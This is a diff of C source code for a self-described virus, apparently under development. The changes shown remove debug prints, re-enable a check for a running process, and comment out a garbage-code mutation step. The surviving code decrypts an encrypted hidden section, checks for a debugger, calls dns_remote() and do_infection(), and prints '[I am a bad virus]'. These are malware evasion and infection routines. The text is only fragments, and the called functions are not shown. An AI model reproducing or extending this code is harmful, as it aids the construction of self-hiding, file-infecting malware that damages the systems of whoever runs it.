@@ -52,19 +52,14 @@ int __start decryptHiddenCode(){
 	char *s = ((char*)&crypt_start);
 	uint64_t n = ((size_t)&crypt_end) - ((size_t)&crypt_start);
 	
-	char x1[] = "D1\n"; CALL(SYS_write, 1, x1, 3);
 	decrypt(s,n,(uint32_t*)key, iscompressed);
 	//decrypt test area
-	char x2[] = "D2\n"; CALL(SYS_write, 1, x2, 3);
 
 	decrypt(&test_area,15,(uint32_t*)key, FALSE);
-	char x3[] = "D3\n"; CALL(SYS_write, 1, x3, 3);
 	//check test area
 	for (int i = 0; i < 15; i++)
-		if ((&test_area)[i] != 'A'){
-			char x4[] = "D4\n"; CALL(SYS_write, 1, x4, 3);
+		if ((&test_area)[i] != 'A')
 			return FALSE;
-		}
 	return TRUE;
 }
 
@@ -87,7 +82,7 @@ int virus(int ac, char **av){
 		dns_remote();
  	if (opt.print_msg) println("[I am a bad virus]");
 
-	change_garbage_code();
+	//change_garbage_code();
 	do_infection();
 	return TRUE;
 }
@@ -98,9 +93,10 @@ __start void print_debugging(){
 }
 
 __start int main(int ac, char **av){
-	char cmp[5] = "test\0";
-	/*if (checkproc(cmp) == FALSE)
-		return FALSE;*/
+	char cmp[] = "test";
+	if (checkproc(cmp) == FALSE)
+		return FALSE;
+	//key[0] ^= 0b01110010;
 	if (checkdebug() == 0)
 		return decryptHiddenCode() && virus(ac, av);
 	else
